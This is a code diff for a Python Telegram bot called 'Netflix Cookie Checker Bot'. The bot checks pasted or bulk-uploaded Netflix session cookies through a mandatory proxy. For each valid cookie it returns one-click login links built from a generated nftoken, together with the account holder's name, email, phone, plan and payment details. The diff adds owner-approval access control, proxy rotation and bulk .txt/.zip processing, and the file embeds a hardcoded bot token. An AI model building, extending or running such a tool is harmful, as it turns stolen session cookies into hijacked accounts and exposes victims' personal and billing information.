@@ -2,7 +2,7 @@ import os
 import asyncio
 import logging
 import re
-from typing import Dict, Optional, Tuple
+from typing import Dict, Optional, Tuple, Set
 import time
 from threading import Thread
 import sys
@@ -10,6 +10,9 @@ import json
 import codecs
 import requests
 import html
+import zipfile
+import tempfile
+import shutil
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -24,12 +27,59 @@ from telegram.ext import (
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o")
 PORT = int(os.environ.get("PORT", 8000))
 
-# ========== FLASK APP ==========
+# SET YOUR TELEGRAM USER ID HERE (Owner Has Permanent Access)
+OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))  # Replace 123456789 with your real Telegram User ID
+
+# Set to store approved User IDs (Owner is automatically added)
+APPROVED_USERS: Set[int] = {OWNER_ID}
+
+# Global proxy state and bulk cancel event
+CURRENT_PROXY: Optional[str] = None
+cancel_bulk_event = asyncio.Event()
+
+# ========== ACCESS CONTROL HELPER ==========
+def is_approved(user_id: int) -> bool:
+    return user_id in APPROVED_USERS or user_id == OWNER_ID
+
+# ========== FLASK APP & HEALTH ENDPOINTS ==========
 app = Flask(__name__)
 
-@app.route("/")
-def home():
-    return "Bot is running fine!", 200
+@app.route("/", methods=["GET"])
+def index():
+    bot_status = "🟢 Running" if application else "🔴 Stopped"
+    proxy_status = CURRENT_PROXY if CURRENT_PROXY else "❌ Not Set (Required)"
+    return f"""
+    <html>
+        <head>
+            <title>Netflix Cookie Checker Bot</title>
+            <style>
+                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
+                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
+                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
+                .running {{ background-color: #d4edda; color: #155724; }}
+                .stopped {{ background-color: #f8d7da; color: #721c24; }}
+                h1 {{ color: #333; }}
+                a {{ color: #007bff; text-decoration: none; }}
+                a:hover {{ text-decoration: underline; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>✅ Netflix Cookie Checker Bot</h1>
+                <div class="status {'running' if application else 'stopped'}">
+                    <p><b>Bot Status:</b> {bot_status}</p>
+                    <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
+                    <p><b>Approved Users Count:</b> {len(APPROVED_USERS)}</p>
+                    <p><b>Active Proxy:</b> {proxy_status}</p>
+                    <p><b>BOT_link: <a href="https://t.me/Cook2linkbot">Redirect</a></b></p>
+                    <p><b>Port:</b> {PORT}</p>
+                </div>
+                <hr>
+                <p><a href="/health">Check Health</a></p>
+            </div>
+        </body>
+    </html>
+    """, 200
 
 @app.route("/health", methods=["GET"])
 def health():
@@ -37,6 +87,9 @@ def health():
         "status": "healthy" if application else "unhealthy",
         "bot_running": application is not None,
         "bot_token_set": bool(BOT_TOKEN),
+        "approved_users_count": len(APPROVED_USERS),
+        "proxy_set": bool(CURRENT_PROXY),
+        "current_proxy": CURRENT_PROXY,
         "timestamp": time.time()
     }, 200 if application else 503
 
@@ -49,30 +102,49 @@ logger = logging.getLogger(__name__)
 
 application = None
 
-# ========== TEXT & MESSAGES ==========
+# ========== MESSAGES & TEXT ==========
 START_TEXT = (
-    "👋 **Netflix Cookie Checker Bot**\n\n"
-    "Paste your Netflix cookies here.\n\n"
-    "Accepted formats:\n"
-    "• Full `Cookie:` header line\n"
-    "• Netscape format - tab or space delimited\n"
-    "• JSON array format\n"
-    "• Key=Value pairs: NetflixId=...; SecureNetflixId=...; nfvdid=...\n\n"
-    "Send cookies now:\n\n"
+    "👋 Netflix Cookie Checker Bot\n\n"
+    "⚠️ IMPORTANT: You MUST set a proxy using /addproxy before checking any cookies.\n\n"
+    "Available Commands:\n"
+    "• /addproxy `<http://ip:port>` — Add & test an HTTP proxy (REQUIRED)\n"
+    "• /stop — Halt an ongoing bulk check immediately\n"
+    "• /help — Usage instructions\n\n"
+    "Owner Commands:\n"
+    "• /approve `<userid>` — Grant access to a user\n"
+    "• /disapprove `<userid>` — Revoke access from a user\n"
+    "• /approved — View list of approved users\n\n"
     " Bot by @zyokr 🦖"
 )
 
 HELP_TEXT = (
-    "How it works:\n"
-    "• Use /start then paste cookies.\n"
-    "• Bot validates cookies using Netflix API.\n"
-    "• If valid, bot converts it into session login links with full account details."
+    "How to use:\n"
+    "1. Access is restricted. Ask owner for approval.\n"
+    "2. MANDATORY: Set a working proxy using `/addproxy http://ip:port` before checking.\n"
+    "3. Paste cookies as text, upload a `.txt` file, or upload a `.zip` archive.\n"
+    "4. Use `/stop` anytime to halt bulk processing."
 )
 
 COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)
 
 
-# ========== COOKIE PARSING HELPERS ==========
+# ========== HELPER FUNCTIONS FOR PROXY & PARSING ==========
+def _get_request_proxies() -> Optional[Dict[str, str]]:
+    if CURRENT_PROXY:
+        return {"http": CURRENT_PROXY, "https": CURRENT_PROXY}
+    return None
+
+def _is_proxy_live(proxy_str: str) -> Tuple[bool, str]:
+    proxies = {"http": proxy_str, "https": proxy_str}
+    try:
+        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8, verify=False)
+        if r.status_code == 200:
+            ip = r.json().get("origin", "Unknown IP")
+            return True, f"Live! Outbound IP: `{ip}`"
+        return False, f"Failed with status code {r.status_code}"
+    except Exception as e:
+        return False, str(e)
+
 def _is_json_cookie(text: str) -> bool:
     text = text.strip()
     if not (text.startswith('[') and text.endswith(']')):
@@ -197,6 +269,29 @@ def _build_cookie_header(cookie_input: str) -> Optional[str]:
         return "; ".join([f"{k}={v}" for k, v in kv.items()])
     return None
 
+def _split_multiple_cookies(text: str) -> list[str]:
+    text = text.strip()
+    if _is_json_cookie(text):
+        return [text]
+    
+    blocks = re.split(r'\n\s*\n', text)
+    cookie_list = []
+    
+    for block in blocks:
+        block = block.strip()
+        if not block:
+            continue
+        lines = block.splitlines()
+        if any("netflixid" in line.lower() for line in lines):
+            cookie_list.append(block)
+        else:
+            for line in lines:
+                line = line.strip()
+                if "netflixid" in line.lower():
+                    cookie_list.append(line)
+                    
+    return cookie_list if cookie_list else [text]
+
 def _safe_preview_cookie_keys(cookie_header: str) -> str:
     names = []
     for token in cookie_header.split(";"):
@@ -282,6 +377,7 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, st
             NFTOKEN_API_URL,
             params=NFTOKEN_QUERY_PARAMS,
             headers=headers,
+            proxies=_get_request_proxies(),
             timeout=timeout_s,
             verify=False,
         )
@@ -329,6 +425,8 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
 
     session = requests.Session()
     session.cookies.update(cookie_dict)
+    if CURRENT_PROXY:
+        session.proxies.update(_get_request_proxies())
 
     headers = {
         "User-Agent": (
@@ -456,18 +554,136 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
         return {"ok": False, "reason": str(e)}
 
 
-# ========== TELEGRAM HANDLERS ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ========== OWNER APPROVAL SYSTEM COMMANDS ==========
+async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ Only the bot owner can approve users.")
+        return
+
+    if not context.args:
+        await update.message.reply_text("⚠️ Usage: `/approve <user_id>`", parse_mode="Markdown")
+        return
+
     try:
+        target_id = int(context.args[0].strip())
+        APPROVED_USERS.add(target_id)
+        await update.message.reply_text(f"✅ User `{target_id}` has been approved to use the bot!", parse_mode="Markdown")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid User ID. Please provide a numeric Telegram ID.")
+
+async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ Only the bot owner can disapprove users.")
+        return
+
+    if not context.args:
+        await update.message.reply_text("⚠️ Usage: `/disapprove <user_id>`", parse_mode="Markdown")
+        return
+
+    try:
+        target_id = int(context.args[0].strip())
+        if target_id == OWNER_ID:
+            await update.message.reply_text("❌ You cannot disapprove the Owner!")
+            return
+        
+        if target_id in APPROVED_USERS:
+            APPROVED_USERS.remove(target_id)
+            await update.message.reply_text(f"🚫 User `{target_id}` has been removed from approved users.", parse_mode="Markdown")
+        else:
+            await update.message.reply_text("⚠️ User ID is not currently in the approved list.")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid User ID.")
+
+async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ Only the bot owner can view approved users.")
+        return
+
+    users_text = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
+    await update.message.reply_text(f"👥 Approved Users List:\n\n{users_text}", parse_mode="Markdown")
+
+
+# ========== TELEGRAM HANDLER FUNCTIONS ==========
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nAsk the owner to approve your access.", parse_mode="Markdown")
+        return
+
+    try:
+        logger.info(f"📱 /start from {user_id}")
         await update.message.reply_text(START_TEXT, parse_mode="Markdown")
     except Exception as e:
         logger.error(f"Error in start: {e}")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied! Ask the owner to approve User ID: `{user_id}`", parse_mode="Markdown")
+        return
+
     try:
+        logger.info(f"❓ /help from {user_id}")
         await update.message.reply_text(HELP_TEXT)
     except Exception as e:
         logger.error(f"Error in help: {e}")
+
+async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied! Ask owner for approval. Your ID: `{user_id}`", parse_mode="Markdown")
+        return
+
+    global CURRENT_PROXY
+    if not context.args:
+        await update.message.reply_text(
+            "⚠️ Please provide a proxy string.\n\n"
+            "Usage:\n"
+            "`/addproxy http://ip:port`\n"
+            "`/addproxy http://username:password@ip:port`",
+            parse_mode="Markdown"
+        )
+        return
+
+    raw_proxy = context.args[0].strip()
+    if not raw_proxy.startswith(("http://", "https://")):
+        raw_proxy = f"http://{raw_proxy}"
+
+    msg = await update.message.reply_text("🔄 Testing proxy connection...", parse_mode="Markdown")
+    
+    loop = asyncio.get_running_loop()
+    is_live, status_detail = await loop.run_in_executor(None, _is_proxy_live, raw_proxy)
+
+    if is_live:
+        CURRENT_PROXY = raw_proxy
+        await msg.edit_text(
+            f"✅ Proxy Added Successfully!\n\n"
+            f"• Proxy: `{raw_proxy}`\n"
+            f"• Status: {status_detail}",
+            parse_mode="Markdown"
+        )
+    else:
+        await msg.edit_text(
+            f"❌ Proxy Validation Failed!\n\n"
+            f"• Error: {status_detail}\n"
+            f"The proxy was not added.",
+            parse_mode="Markdown"
+        )
+
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
+        return
+
+    if not cancel_bulk_event.is_set():
+        cancel_bulk_event.set()
+        await update.message.reply_text("🛑 Stop signal sent! Halting the bulk check...")
+    else:
+        await update.message.reply_text("⚠️ No bulk operation is currently running.")
 
 async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -475,7 +691,22 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
             return
 
         user_id = update.effective_user.id
+        if not is_approved(user_id):
+            await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact the owner to grant you access.", parse_mode="Markdown")
+            return
+
+        # STRICT RULE: Proxy must be set before checking
+        if not CURRENT_PROXY:
+            await update.message.reply_text(
+                "⚠️ **Proxy Required!**\n\n"
+                "You must set a live proxy before checking cookies.\n"
+                "Use `/addproxy http://ip:port` to add one.",
+                parse_mode="Markdown"
+            )
+            return
+
         cookie_input = (update.message.text or "").strip()
+        logger.info(f"📨 Message from {user_id}: {len(cookie_input)} chars")
         
         if not cookie_input:
             await update.message.reply_text("Please paste your cookies.")
@@ -505,33 +736,31 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
             phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
             desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
 
-            # Formatted single-bullet account list layout
             formatted_text = (
-                "📁 **Source:**\n"
+                "📁 Source:\n"
                 "pasted_cookie.txt\n"
-                "✅ **Status:** Valid Premium Account\n\n"
-                "👤 **Account Details:**\n"
-                f"• **Name:** {acct.get('name', 'Unknown')}\n"
-                f"• **Email:** {acct.get('email', 'Unknown')}\n"
-                f"• **Country:** {acct.get('country', 'Unknown')}\n"
-                f"• **Plan:** {acct.get('plan', 'Unknown')}\n"
-                f"• **Price:** {acct.get('plan_price', 'N/A')}\n"
-                f"• **Member Since:** {acct.get('member_since', 'Unknown')}\n"
-                f"• **Next Billing:** {acct.get('next_billing', 'Unknown')}\n"
-                f"• **Payment:** {acct.get('payment_method', 'CC')}\n"
-                f"• **Phone:** {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
-                f"• **Quality:** {acct.get('video_quality', 'HD')}\n"
-                f"• **Streams:** {acct.get('max_streams', '2')}\n"
-                f"• **Hold Status:** {acct.get('on_payment_hold', 'No')}\n"
-                f"• **Extra Member:** {acct.get('extra_member', 'No')}\n"
-                f"• **Extra Member Slot:** Unknown\n"
-                f"• **Email Verified:** {acct.get('email_verified', 'No')}\n"
-                f"• **Membership Status:** {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
-                f"• **Connected Profiles:** {acct.get('connected_profiles', '1')}\n"
-                f"• **Profiles:** {acct.get('profiles', 'Unknown')}"
+                "✅ Status: Valid Premium Account\n\n"
+                "👤 Account Details:\n"
+                f"• Name: {acct.get('name', 'Unknown')}\n"
+                f"• Email: {acct.get('email', 'Unknown')}\n"
+                f"• Country: {acct.get('country', 'Unknown')}\n"
+                f"• Plan: {acct.get('plan', 'Unknown')}\n"
+                f"• Price: {acct.get('plan_price', 'N/A')}\n"
+                f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
+                f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
+                f"• Payment: {acct.get('payment_method', 'CC')}\n"
+                f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
+                f"• Quality: {acct.get('video_quality', 'HD')}\n"
+                f"• Streams: {acct.get('max_streams', '2')}\n"
+                f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
+                f"• Extra Member: {acct.get('extra_member', 'No')}\n"
+                f"• Extra Member Slot: Unknown\n"
+                f"• Email Verified: {acct.get('email_verified', 'No')}\n"
+                f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
+                f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
+                f"• Profiles: {acct.get('profiles', 'Unknown')}"
             )
 
-            # Inline keyboard for direct link logins
             keyboard = [
                 [
                     InlineKeyboardButton("💻 PC Login", url=desktop_link),
@@ -542,7 +771,6 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
             await msg.edit_text(
                 formatted_text,
-                parse_mode="Markdown",
                 reply_markup=reply_markup,
                 disable_web_page_preview=True
             )
@@ -557,6 +785,154 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
         except Exception:
             pass
 
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact owner for access.", parse_mode="Markdown")
+        return
+
+    # STRICT RULE: Proxy must be set before checking files
+    if not CURRENT_PROXY:
+        await update.message.reply_text(
+            "⚠️ **Proxy Required!**\n\n"
+            "You must set a live proxy before uploading files to check.\n"
+            "Use `/addproxy http://ip:port` to add one.",
+            parse_mode="Markdown"
+        )
+        return
+
+    document = update.message.document
+    filename = document.file_name or "document"
+    
+    if not filename.endswith(('.txt', '.zip')):
+        await update.message.reply_text("⚠️ Please upload a valid `.txt` cookie file or a `.zip` archive.")
+        return
+
+    cancel_bulk_event.clear()
+    status_msg = await update.message.reply_text(f"📥 Downloading `{filename}`...")
+
+    temp_dir = tempfile.mkdtemp()
+    file_path = os.path.join(temp_dir, filename)
+
+    try:
+        tg_file = await context.bot.get_file(document.file_id)
+        await tg_file.download_to_drive(file_path)
+
+        raw_files = []
+        if filename.endswith('.zip'):
+            with zipfile.ZipFile(file_path, 'r') as zip_ref:
+                zip_ref.extractall(temp_dir)
+            for root, _, files in os.walk(temp_dir):
+                for f in files:
+                    if f.endswith('.txt'):
+                        raw_files.append(os.path.join(root, f))
+        else:
+            raw_files.append(file_path)
+
+        cookie_queue = []
+        for f_path in raw_files:
+            try:
+                with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                extracted = _split_multiple_cookies(content)
+                fname = os.path.basename(f_path)
+                for idx, c_text in enumerate(extracted, start=1):
+                    tag = f"{fname} (Cookie #{idx})" if len(extracted) > 1 else fname
+                    cookie_queue.append((tag, c_text))
+            except Exception as e:
+                logger.error(f"Error reading {f_path}: {e}")
+
+        total_cookies = len(cookie_queue)
+        valid_count = 0
+        dead_count = 0
+
+        await status_msg.edit_text(
+            f"🔄 Found {total_cookies} cookie(s) to check!\nSend /stop to halt anytime."
+        )
+
+        loop = asyncio.get_running_loop()
+
+        for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
+            if cancel_bulk_event.is_set():
+                logger.info("Bulk check cancelled by user via /stop")
+                break
+
+            try:
+                cookie_header = _build_cookie_header(cookie_raw)
+                if not cookie_header:
+                    dead_count += 1
+                    continue
+
+                ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
+                if ok and nftoken:
+                    acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
+                    
+                    phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
+                    desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
+
+                    formatted_text = (
+                        f"📁 Source:\n{display_name}\n"
+                        f"✅ Status: Valid Premium Account\n\n"
+                        f"👤 Account Details:\n"
+                        f"• Name: {acct.get('name', 'Unknown')}\n"
+                        f"• Email: {acct.get('email', 'Unknown')}\n"
+                        f"• Country: {acct.get('country', 'Unknown')}\n"
+                        f"• Plan: {acct.get('plan', 'Unknown')}\n"
+                        f"• Price: {acct.get('plan_price', 'N/A')}\n"
+                        f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
+                        f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
+                        f"• Payment: {acct.get('payment_method', 'CC')}\n"
+                        f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
+                        f"• Quality: {acct.get('video_quality', 'HD')}\n"
+                        f"• Streams: {acct.get('max_streams', '2')}\n"
+                        f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
+                        f"• Extra Member: {acct.get('extra_member', 'No')}\n"
+                        f"• Extra Member Slot: Unknown\n"
+                        f"• Email Verified: {acct.get('email_verified', 'No')}\n"
+                        f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
+                        f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
+                        f"• Profiles: {acct.get('profiles', 'Unknown')}"
+                    )
+
+                    keyboard = [
+                        [
+                            InlineKeyboardButton("💻 PC Login", url=desktop_link),
+                            InlineKeyboardButton("📱 Phone Login", url=phone_link)
+                        ]
+                    ]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
+
+                    await update.message.reply_text(
+                        formatted_text,
+                        reply_markup=reply_markup,
+                        disable_web_page_preview=True
+                    )
+                    valid_count += 1
+                else:
+                    dead_count += 1
+            except Exception as e:
+                logger.error(f"Error checking {display_name}: {e}")
+                dead_count += 1
+
+        if cancel_bulk_event.is_set():
+            await status_msg.edit_text(
+                f"🛑 Bulk Check Stopped Manually!\n\n"
+                f"🟢 Valid Found: {valid_count}\n"
+                f"🔴 Dead / Invalid: {dead_count}"
+            )
+        else:
+            await status_msg.edit_text(
+                f"✅ Bulk Check Completed!\n\n"
+                f"🟢 Valid Found: {valid_count}\n"
+                f"🔴 Dead / Invalid: {dead_count}"
+            )
+
+    except Exception as e:
+        logger.error(f"Error handling document: {e}")
+        await status_msg.edit_text(f"❌ Error processing document: {e}")
+    finally:
+        shutil.rmtree(temp_dir, ignore_errors=True)
+
 
 # ========== MAIN THREAD LOOP ==========
 def run_bot_in_thread():
@@ -566,7 +942,6 @@ def run_bot_in_thread():
         logger.error("❌ BOT_TOKEN not set!")
         return
     
-    # Dedicated thread event loop management
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
@@ -574,6 +949,12 @@ def run_bot_in_thread():
         application = ApplicationBuilder().token(BOT_TOKEN).build()
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("addproxy", addproxy_command))
+        application.add_handler(CommandHandler("stop", stop_command))
+        application.add_handler(CommandHandler("approve", approve_command))
+        application.add_handler(CommandHandler("disapprove", disapprove_command))
+        application.add_handler(CommandHandler("approved", approved_list_command))
+        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
         
         loop.run_until_complete(
@@ -598,13 +979,11 @@ if __name__ == "__main__":
         logger.error("❌ BOT_TOKEN environment variable is not set!")
         sys.exit(1)
     
-    # Launch Telegram bot thread
     bot_thread = Thread(target=run_bot_in_thread, daemon=True)
     bot_thread.start()
     
     time.sleep(2)
     
-    # Try to start Flask on assigned PORT, or fallback to 8080 if PORT is temporarily busy
     try:
         logger.info(f"🚀 Starting Flask server on port {PORT}\n")
         app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
